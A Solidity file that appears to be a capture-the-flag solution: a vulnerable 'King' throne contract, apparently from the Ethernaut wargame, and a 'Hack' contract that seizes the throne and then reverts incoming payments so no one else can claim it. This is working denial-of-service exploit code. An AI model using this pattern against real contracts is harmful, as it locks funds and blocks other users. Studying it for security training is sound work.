// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Hack {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(address _king) public payable {
        require(msg.sender == owner, "not owner");
        (bool success, ) = (_king).call{value: msg.value}("");
        require(success == true, "Call failed");
    }

    receive() external payable {
        if (msg.sender == owner) {} else {
            revert();
        }
    }


    function withdraw() public payable {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
